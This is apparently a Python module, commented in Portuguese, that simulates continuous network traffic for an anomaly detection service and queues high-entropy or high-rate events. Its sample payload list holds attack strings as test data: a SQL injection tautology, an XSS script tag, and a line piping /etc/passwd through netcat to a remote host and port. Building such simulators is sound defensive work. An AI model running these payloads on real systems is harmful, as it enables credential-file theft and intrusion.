import asyncio
import random
import uuid
import time
from common.events import EventoAnomaliaBruta


async def gerar_trafego_continuo(queue_out: asyncio.Queue):
    """
    Simula a ingestão contínua de eventos de tráfego de rede e
    os envia para a fila do Serviço de Diagnóstico.
    """
    print("[DETECTOR] Serviço de Detecção de Anomalias iniciado...")

    ips_suspeitos = [
        "192.168.1.50",
        "172.16.0.99",
        "45.33.22.11",
        "10.0.0.12",
        "185.220.101.5",
    ]

    payloads_exemplo = [
        "GET /api/v1/resource HTTP/1.1",
        "POST /login -d 'user=admin'",
        "SELECT * FROM users WHERE '1'='1'",
        "cat /etc/passwd | nc 10.0.0.1 4444",
        "GET /?search=<script>alert(1)</script>",
    ]

    while True:
        ip = random.choice(ips_suspeitos)
        entropia = round(random.uniform(4.0, 7.8), 2)
        rps = random.randint(30, 160)
        payload = random.choice(payloads_exemplo)

        evento = EventoAnomaliaBruta(
            event_id=str(uuid.uuid4())[:8],
            ip_origem=ip,
            timestamp=time.time(),
            entropia_payload=entropia,
            requisicoes_por_segundo=rps,
            payload_sample=payload,
        )

        if entropia >= 7.0 or rps >= 70:
            print(
                f"[DETECTOR -> ALERTA] IP: {evento.ip_origem} | "
                f"Entropia: {evento.entropia_payload} | RPS: {evento.requisicoes_por_segundo} | ID: {evento.event_id}"
            )
            await queue_out.put(evento)

        await asyncio.sleep(0.3)